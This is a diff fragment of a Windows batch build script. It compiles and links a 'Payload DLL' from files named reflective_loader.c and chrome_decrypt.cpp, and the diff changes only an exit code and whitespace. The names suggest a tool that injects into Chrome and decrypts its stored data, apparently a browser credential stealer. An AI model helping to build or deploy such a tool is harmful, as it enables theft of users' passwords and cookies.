@@ -178,13 +178,16 @@ goto :eof
     call :log_step "[2/6] Compiling Payload DLL (%PAYLOAD_DLL_NAME%)"
     set "CMD_C=cl %CFLAGS_COMMON% /c %SRC_DIR%\reflective_loader.c /Fo"%BUILD_DIR%\reflective_loader.obj""
     call :run_command "%CMD_C%" "  - Compiling C file (reflective_loader.c)..."
-    if %errorlevel% neq 0 exit /b 1
+    if %errorlevel% neq 0 exit /b 11
+
     set "CMD_CPP=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\sqlite /c %SRC_DIR%\chrome_decrypt.cpp /Fo"%BUILD_DIR%\chrome_decrypt.obj""
     call :run_command "%CMD_CPP%" "  - Compiling C++ file (chrome_decrypt.cpp)..."
     if %errorlevel% neq 0 exit /b 1
+    
     set "CMD_LINK=link /NOLOGO /DLL /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.obj" "%BUILD_DIR%\reflective_loader.obj" "%BUILD_DIR%\sqlite3.lib" bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /IMPLIB:"%BUILD_DIR%\chrome_decrypt.lib""
     call :run_command "%CMD_LINK%" "  - Linking objects into DLL..."
     if %errorlevel% neq 0 exit /b 1
+    
     call :log_success "Payload DLL compiled successfully."
     echo.
 goto :eof
